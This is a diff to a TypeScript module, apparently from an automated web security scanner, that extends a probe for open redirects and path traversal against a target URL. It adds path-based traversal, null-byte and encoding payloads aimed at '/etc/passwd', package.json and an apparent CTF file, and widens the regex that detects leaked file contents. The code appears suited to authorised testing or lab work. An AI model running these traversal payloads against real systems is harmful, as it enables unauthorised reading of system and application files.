@@ -10,6 +10,8 @@ export interface RtInput {
   readonly baseUrl: string;
   /** candidate parameter names (from param mining); default common redirect params */
   readonly params?: readonly string[];
+  /** path-based traversal: append encodings directly to the URL path (…/ftp/file→…/ftp/<payload>) */
+  readonly pathTraversal?: boolean;
   readonly outputRoot: string;
   readonly cookie?: string;
   readonly headers?: Record<string, string>;
@@ -69,6 +71,12 @@ export const probeRedirectTraversal = async (input: RtInput): Promise<RtResult> 
     { name: "utf8-overlong", value: "%c0%ae%c0%ae%2fetc%2fpasswd" },
     { name: "null-byte", value: "../../etc/passwd%00.png" },
     { name: "semi-null", value: ";../../etc/passwd" },
+    { name: "null-suffix-md", value: "package.json%2500.md" },
+    { name: "null-suffix-pdf", value: "package.json%2500.pdf" },
+    { name: "null-suffix-direct", value: "eastere.gg%2500.md" },
+    { name: "dot-bak", value: "package.json.bak" },
+    { name: "encoded-dot", value: "package%2Ejson" },
+    { name: "double-null", value: "package.json%252500.md" },
   ];
   const redirectCases: RedirectCase[] = [];
   const redirectFindings: RedirectCase[] = [];
@@ -94,23 +102,32 @@ export const probeRedirectTraversal = async (input: RtInput): Promise<RtResult> 
   }
   // traversal: 只对 path/file/doc 类参数
   const travParams = (input.params ?? []).filter(p => /path|file|doc|dir|page|template|include|load|view|name|lang/i.test(p));
-  for (const p of travParams.length > 0 ? travParams : ["file", "path", "doc"]) {
+  const travTargets: { param: string; make: (enc: string) => string }[] = [];
+  if (input.pathTraversal === true) {
+    travTargets.push({ param: "(path)", make: enc => input.baseUrl.replace(/\/$/, "") + "/" + enc });
+  }
+  for (const p of travParams.length > 0 ? travParams : ["file", "path", "doc"]) travTargets.push({ param: p, make: enc => { const u = new URL(input.baseUrl); u.searchParams.set(p, enc); return u.toString(); } });
+  for (const t of travTargets) {
     for (const enc of traversalEncodings) {
-      const u = new URL(input.baseUrl);
-      u.searchParams.set(p, enc.value);
+      const u = t.make(enc.value);
       try {
-        const r = await fetchUrl(u.toString(), { cookie: input.cookie, headers: input.headers, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 15000 });
+        const r = await fetchUrl(u, { cookie: input.cookie, headers: input.headers, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 15000 });
         const body = r.body;
-        const etcdLike = /root:[x*!]?:0:0:|daemon:.*:\/usr\/sbin\/nolist|bin:.*:\/bin\/|www-data:/i.test(body);
-        const tc: TraversalCase = { url: u.toString().slice(0, 180), param: p, encoding: enc.name, payload: enc.value, status: r.status, length: r.bytes, etcdLike };
+        const etcdLike = /root:[x*!]?:0:0:|daemon:.*:\/usr\/sbin\/nolist|bin:.*:\/bin\/|www-data:|"dependencies"|"main":|"scripts"|Congratulations[^<]{0,40}(?:egg|challenge)|"#!\/usr\/bin\/env/i.test(body);
+        const tc: TraversalCase = { url: u.slice(0, 180), param: t.param, encoding: enc.name, payload: enc.value, status: r.status, length: r.bytes, etcdLike };
         traversalCases.push(tc);
         if (etcdLike) traversalFindings.push(tc);
       } catch { /* network */ }
     }
   }
+  // soft-404校准: 出现频率最高的响应长度 = SPA fallback, 排除
+  const lenCounts = new Map<number, number>();
+  for (const c of traversalCases) lenCounts.set(c.length, (lenCounts.get(c.length) ?? 0) + 1);
+  const fallbackLen = [...lenCounts.entries()].sort((a, b) => b[1] - a[1])[0]?.[0];
+  const filtered = fallbackLen === undefined ? traversalCases : traversalCases.filter(c => c.length !== fallbackLen || c.etcdLike);
   const artifacts = [
     await writeArtifact(input.outputRoot, "redirect_cases.json", JSON.stringify(redirectCases, null, 2)),
-    await writeArtifact(input.outputRoot, "traversal_cases.json", JSON.stringify(traversalCases, null, 2)),
+    await writeArtifact(input.outputRoot, "traversal_cases.json", JSON.stringify({ fallbackLength: fallbackLen, probed: traversalCases.length, effective: filtered.length, cases: traversalCases }, null, 2)),
     await writeArtifact(input.outputRoot, "redirect_traversal_findings.md", [
       "# Open redirect / path traversal",
       "",
